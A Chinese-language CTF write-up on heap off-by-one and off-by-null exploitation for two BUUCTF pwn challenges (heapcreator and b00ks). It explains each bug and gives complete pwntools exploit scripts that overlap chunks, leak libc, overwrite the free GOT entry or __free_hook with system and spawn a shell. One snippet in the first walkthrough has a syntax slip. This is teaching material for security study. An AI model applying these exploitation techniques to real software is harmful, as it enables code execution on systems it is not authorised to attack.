# 堆中of_by_one

## 介绍：

1. 严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向**缓冲区**中写入时，写入的字节数**超过了**这个缓冲区本身所申请的字节数并且**只越界了一个字节**。
1. 溢出字节为**可控制任意字节** ：通过修改大小(size字段值)造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。

## 1. 例题：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#hitcontraining_heapcreator)

题目：                                                                                                                                                                    1

1. 先看一下create函数创建出来的heap结构：

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091542459.png)

   ![image-20240709153741797](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091537852.png)

2. delete函数中将heap指针清0了，所以不能利用UAF：

   <img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091542820.png" alt="image-20240709154254757" style="zoom:50%;" />

3. 但是在edit函数中，存在of_by_one漏洞，会多接受一个输入，可以利用着来覆盖下一个chunk的size大小，从而实现chunk的覆盖：

   ![image-20240709154340482](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091543546.png)

## 利用：

1. 首先我们申请的长度要恰好到下一个chunk的size字段，所以必须将下一个chunk的prev_size字段沾满，不能留空隙，所以申请的大小必须为**0x10的整数倍+8**：

   ![image-20240709154846223](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091548482.png)

   这种情况才能占满（将**下一个chunk的prev_size字段**占满，才能顺利覆盖到后面的size字段）：

   ![image-20240709155150227](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091551388.png)

2. 先申请两个大小为0x18的heap：

   ```python
   add(24,b'a')    #0
   add(24,b'b')    #1
   ```

3. 再编辑chunk0，利用of_by_one漏洞，覆盖掉chunk1的size字段，大小最少要为0x：

   ```python
   edit(0,B'/bin/sh\x00'+ b"\x00"*16+b'\x41')
   ```

4. 再释放掉chunk1，此时就能得到一个0x40和一个0x10的fastbin：

   ![image-20240709155927573](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091559709.png)

5. 此时再申请一个大小为0x30的chunk2，就会将fastbins[0x40]分配给我们（但是实际的大小只有0x18，但是写入的大小就是0x30了），可以导致chunk之间的覆盖（变向堆溢出）。但是如何填充数据泄漏libc地址呢？，需要使用到show函数，并且利用前面造成的堆溢出将content地址改为函数的got表地址（这里以free函数为例）：

   ![image-20240709160525868](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091605924.png)

   ```python
   add(0x30,b"A"*16 + p64(0)*+p64(0x21)+p64(0x30)+p64(elf.got["free"]))  #2
   ```

   ![image-20240709161225369](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091612531.png)

   调用show函数输出chunk2就能泄漏libc地址，再计算活得system的地址：

   ```python
   printf(1)
   p.recvuntil(b"Content : ")
   addr = u64(p.recv(6).ljust(8,b'\x00'))
   print(hex(addr))
   libc_base = addr - 0x844f0
   sys_addr = libc_base + 0x45390
   sh_addr = libc_base + 0x18cd17
   log.success("libc_addr==>"+hex(libc_base))
   log.success("system_addr==>"+hex(sys_addr))
   log.success("bin_sh_addr==>"+hex(sh_addr))
   
   ```

   ![image-20240709161346767](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091613867.png)

6. 最后利用edit(2)，将free函数的got表中的数据修改为system的地址，即可完成对free函数的挟持，前面再第一次溢出在content处时填入的"/bin/sh"其地址就会作为free函数的参数（system("/bin/sh")）：

   ![image-20240709162238290](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091622343.png)

   ```python
   edit(1,p64(sys_addr))
   ```

   ![image-20240709161912317](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091619532.png)

7. 最后free(0)即可拿到flag。EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   
   # p = remote("node5.buuoj.cn",25567)
   p = process("./pwn")
   libc = ELF('./libc-2.23.so')
   elf = ELF("./pwn")
   n2b = lambda x    : str(x).encode()
   rv  = lambda x    : p.recv(x)
   ru  = lambda s    : p.recvuntil(s)
   sd  = lambda s    : p.send(s)
   sl  = lambda s    : p.sendline(s)
   sn  = lambda s    : sl(n2b(n))
   sa  = lambda t, s : p.sendafter(t, s)
   sla = lambda t, s : p.sendlineafter(t, s)
   sna = lambda t, n : sla(t, n2b(n))
   ia  = lambda      : p.interactive()
   rop = lambda r    : flat([p64(x) for x in r])
   def add(size,content):
       sla(b'Your choice :','1')
       sla(':',str(size))
       sla(':',content)
   
   def edit(idx, content):
       sla(':','2')
       sla('Index :',str(idx))
       # sla(':',str(len(content)))
       sa(b':',content)
   
   def printf(index):
       p.sendlineafter(b'Your choice :',b'3')
       p.sendlineafter(b'Index :',str(index).encode())
   
   def free(idx):
       sla(':','4')
       sla(':',str(idx))
   
   
   add(24,b'a')    #0
   add(24,b'b')    #1
   edit(0,B'/bin/sh\x00'+ b"\x00"*16+b'\x41')
   free(1)
   add(0x30,b"A"*8 + p64(0)*2+p64(0x21)+p64(0x30)+p64(elf.got["free"]))  #2
   
   printf(1)
   p.recvuntil(b"Content : ")
   addr = u64(p.recv(6).ljust(8,b'\x00'))
   print(hex(addr))
   
   libc_base = addr - 0x844f0
   sys_addr = libc_base + 0x45390
   sh_addr = libc_base + 0x18cd17
   log.success("libc_addr==>"+hex(libc_base))
   log.success("system_addr==>"+hex(sys_addr))
   log.success("bin_sh_addr==>"+hex(sh_addr))
   
   edit(1,p64(sys_addr))
   free(0)
   
   p.interactive()
   
   
   ```

   ![image-20240709162728904](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407091627967.png)

## 2.  例题：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#asis2016_b00ks)

### 思路：

1. 利用off_by_one 溢出位是NULL，伪造假的结构体，进而挟持程序实现任意地址读写数据。

### 分析：

1. 自定义的read函数中存在off_by_NULL溢出，：

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151030681.png)

2. author name存放的位置与books指针存放位置紧贴，并且刚好溢出以恶搞NULL字节，可以基于此构造:

   ![image-20240715103152264](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151031319.png)

3. create函数，整体看一下函数生成的堆的结构，可以看到其申请了一个固定大小0x28的chunk来管理book的各种属性，并且全局变量unk_202060中会存放该**结构体的首地址** （图中为：**0x555555a01460**）（后面伪造books的结构体要于此一一对应）：

   ![image-20240715115719311](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151157391.png)

   ![image-20240715103240571](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151032771.png)

   可以在ida中加入下面的结构体：

   ![image-20240715115446022](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151154085.png)

   如果此时再次编辑author姓名，填满32个字节，那么后面第33个字节将会造成溢出，被覆盖成b"\x00"，即0x555555a01460==>0x555555a01400:

   ![image-20240715104134562](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151041649.png)

   change(b"a"*32)前后，观察该处指针值变化：

   ![image-20240715105418854](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151054022.png)

4. delete函数，根据ID删除book，book指针被清0，所以没有UAF漏洞：

   ![image-20240715115549542](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151155636.png)

5. edit函数，根据ID找到book，但是只能编辑description部分的内容，所以最后我们要将伪造的book选址放在可以编辑的description部分，这样才能控制任意地址：

   ![image-20240715115824299](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151158390.png)

6. printf函数，打印所有读书的信息，访问了book结构中的两个地址name地址和description地址（后续伪造的book，这两个地址需要精准控制）：

   ![image-20240715115609266](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151156343.png)

7. change函数，改author name，后续利用它的off_by_null漏洞覆盖booklist中指针的值：

   ![image-20240715110128021](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151101068.png)

### 利用：

1. 首先需要拿到一个堆地址，后续才能在伪造book结构体的时候有地址使用：先写入32字节的author name，将name的32个空间占满（由于此时booklist中还未写入book结构体地址，所以后续写入的地址会覆盖最后第33个字节的b"\x00"，从而在输出的时候泄漏堆地址），再申请一个book，但是book的大小如何控制呢？（申请两个不同的大小调试看看）：

   ```python
   p.sendlineafter(b':',b'a'*32)
   #description为0x110
   add(0x10,0x110,b"aaaa",b"bbbb")
   #description为0x10
   add(0x10,0x10,b"aaaa",b"bbbb")
   ```

   当申请较小的description时：

   ![image-20240715111058934](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151110098.png)

   但是，当申请较大的description时，所以相比之下一改**选择较大的空间**来申请，后续才能伪造book结构体：

   ![image-20240715111244017](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151112240.png)

   第一步：

   ```python
   p.sendlineafter(b':',b'a'*32)
   add(0x10,0x110,b"aaaa",b"bbbb")	#book1
   add(0x80,0x100,b"FFFFFFFF",b"FFFFFFFF")	#book2，进入unsortedbin用来泄漏main_arena地址
   free(2)
   show()
   #接受泄漏的堆地址
   p.recvuntil(b"a"*32)
   addr = u64(p.recv(6).ljust(8,b'\x00'))
   success("addr==>"+hex(addr))
   ```

2. 确定地址，在**0x55a65a3c1100** 处伪造book的结构体（在change(b"a"*32)之前伪造，之后以为booklist中的指针被覆盖，我们将**无法控制该book的description**）：

   ```python
   show_main_arena = addr+0x30
   any_addr_write = addr+0x1E0
   payload = b"FFFFFFFF"*12*2+p64(1)+p64(show_main_arena)+p64(any_addr_write)+p64(0xFFF)
   edit(1,payload)
   #修改booklist指针的最低为字节为b"\x00",指向伪造的结构体
   change(b"a"*32)
   ```

   解释选择这两个地址的原因：

   * show_main_arena = addr+0x30：为了在book2进入unsortedbin后读取其中的main_arena地址：

   ![image-20240715113008702](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151130444.png)

   * **any_addr_write= addr+0x1E0**：为例实现任意地址写入数据，控制后来申请的book3的book结构体中的descripton地址。

   ![image-20240715113816156](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151138500.png)

3. 泄漏main_arena中的地址：

   ```python
   #泄漏main_arena
   show()
   p.recv()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x58)
   success("libc_addr==>"+hex(libc_base))
   #计算__free_hook和system地址
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   ```

4. 申请回book3后，book3的description地址，作为我们任意写的地址，book3即为我们挟持的傀儡：

   ```python
   #申请回book3
   add(0x80,0x100,b"/bin/sh\x00",b"/bin/sh\x00")   #3
   #向存放book3的description地址的位置写入free_hook地址
   payload1 = p64(free_hook_addr)
   edit(1,payload1)
   #修改free_hook，用system覆盖
   payload2 = p64(system_addr)
   edit(3,payload2)
   ```

   ![image-20240715114434439](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151144704.png)

5. 最后free(3)即可拿到shell，完整EXP：

   ```python
   from pwn import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       print(proc.pidof(p))
       pause()
    
   # p = remote("node5.buuoj.cn",28493)
   p = process("./pwn")
   libc = ELF('/home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
   elf = ELF("./pwn")
   
   def add(name_size,description_size,name,description):
       p.sendlineafter(b'>',b'1')
       p.sendlineafter(b':',str(name_size).encode())
       p.sendlineafter(b':',name)
       p.sendlineafter(b':',str(description_size).encode())
       p.sendlineafter(b':',description)
   
   def edit(ID, description):
       p.sendlineafter(b'>',b'3')
       p.sendlineafter(b':',str(ID).encode())
       # p.sendlineafter(b':',str(len(content)))
       p.sendlineafter(b':',description)
   
   def show():
       p.sendlineafter(b'>',b'4')
       # p.sendlineafter(b':',str(index).encode())
   
   def free(index):
       p.sendlineafter(b'>',b'2')
       p.sendlineafter(b':',str(index).encode())
   
   def change(author_name):
       p.sendlineafter(b'>',b'5')
       p.sendlineafter(b':',author_name)
   
   p.sendlineafter(b':',b'a'*32)
   add(0x10,0x110,b"aaaa",b"bbbb")
   add(0x80,0x100,b"FFFFFFFF",b"FFFFFFFF")
   free(2)
   show()
   p.recvuntil(b"a"*32)
   addr = u64(p.recv(6).ljust(8,b'\x00'))
   success("addr==>"+hex(addr))
   
   show_main_arena = addr+0x30
   any_addr_write_print = addr+0x1E0
   payload = b"FFFFFFFF"*12*2+p64(1)+p64(show_main_arena)+p64(any_addr_write_print)+p64(0xFFF)
   edit(1,payload)
   change(b"a"*32)
   
   show()
   p.recv()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x58)
   success("libc_addr==>"+hex(libc_base))
   
   #计算__free_hook和system地址
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   
   add(0x80,0x100,b"/bin/sh\x00",b"/bin/sh\x00")   #3
   payload1 = p64(free_hook_addr)
   edit(1,payload1)
   
   payload2 = p64(system_addr)
   edit(3,payload2)
   free(3)
   
   p.sendline(b"cat flag")
   p.interactive()                             
   ```

   ![image-20240715114612435](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151146637.png)